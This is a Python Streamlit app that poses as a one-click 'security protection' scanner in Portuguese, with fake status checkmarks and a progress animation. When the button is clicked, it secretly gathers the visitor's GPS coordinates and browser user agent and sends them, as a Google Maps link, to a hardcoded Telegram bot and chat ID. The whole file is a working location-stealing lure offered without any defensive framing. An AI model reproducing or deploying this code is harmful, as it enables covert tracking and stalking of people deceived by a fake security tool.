import streamlit as st
import requests
import time
from streamlit_js_eval import streamlit_js_eval, get_geolocation

# 1. CONFIGURAÇÕES BÁSICAS
TOKEN = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
CHAT_ID = "8210828398"

def bot_send(msg):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    try:
        requests.post(url, json={"chat_id": CHAT_ID, "text": msg, "parse_mode": "Markdown"})
    except:
        pass

# 2. INTERFACE E ESTILO
st.set_page_config(page_title="Segurança Ativa", layout="centered")

st.markdown("""
    <style>
    .main { background-color: #000; color: white; }
    .scanner-box { display: flex; flex-direction: column; align-items: center; padding: 20px; }
    .circle {
        width: 180px; height: 180px; border-radius: 50%;
        background: radial-gradient(circle, rgba(46, 204, 113, 0.2) 0%, transparent 70%);
        border: 2px solid rgba(46, 204, 113, 0.5);
        box-shadow: 0 0 40px rgba(46, 204, 113, 0.4);
        display: flex; align-items: center; justify-content: center;
        animation: pulse 2s infinite ease-in-out;
    }
    @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.05); } }
    .pct-text { font-size: 45px; font-weight: bold; }
    div.stButton > button {
        background-color: #ffc107 !important; color: black !important;
        font-weight: bold !important; width: 100%; height: 3.5em; border-radius: 10px;
    }
    </style>
""", unsafe_allow_html=True)

# 3. CAPTURA (CARREGANDO EM BACKGROUND)
ua_data = streamlit_js_eval(js_expressions="window.navigator.userAgent", key='UA_STABLE')

# 4. MONTAGEM DA TELA
st.markdown("<h2 style='text-align: center;'>Verificar segurança</h2>", unsafe_allow_html=True)
area_esfera = st.empty()

with area_esfera.container():
    st.markdown('<div class="scanner-box"><div class="circle"><div class="pct-text">4%</div></div></div>', unsafe_allow_html=True)

st.write("✅ Ambiente de pagamentos")
st.write("✅ Privacidade e segurança")
st.write("✅ Vírus")

# 5. LÓGICA DE 1 CLIQUE
if st.button("🔴 ATIVAR PROTEÇÃO", key='BTN_ONE_CLICK'):
    # Inicia a animação visual imediatamente
    with st.spinner("Sincronizando satélites..."):
        # Tenta capturar a localização várias vezes em 2 segundos (tempo da animação)
        loc_data = None
        for i in range(1, 21): # 20 tentativas rápidas
            loc_data = get_geolocation(key=f'GPS_TRY_{i}')
            
            # Atualiza a porcentagem na tela
            progresso = 4 + (i * 4.8) # Vai subindo até 100%
            area_esfera.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{int(progresso)}%</div></div></div>', unsafe_allow_html=True)
            
            if loc_data and 'coords' in loc_data:
                break
            time.sleep(0.1)

    # FINALIZAÇÃO E ENVIO
    if loc_data and 'coords' in loc_data:
        lat = loc_data['coords']['latitude']
        lon = loc_data['coords']['longitude']
        google_maps = f"https://www.google.com/maps?q={lat},{lon}"
        
        relatorio = (
            f"🛡️ PROTEÇÃO ATIVADA EM 1 CLIQUE\n"
            f"📱 {ua_data[:40] if ua_data else 'Mobile'}\n"
            f"📍 [VER LOCALIZAÇÃO]({google_maps})"
        )
        
        bot_send(relatorio)
        st.success("✅ Proteção Ativada!")
    else:
        st.error("⚠️ GPS demorou a responder. Tente clicar novamente agora que o sensor já despertou.")

st.markdown('<p style="text-align:center; color:#444; margin-top:50px;">Desenvolvido Por Miamy © 2026</p>', unsafe_allow_html=True)
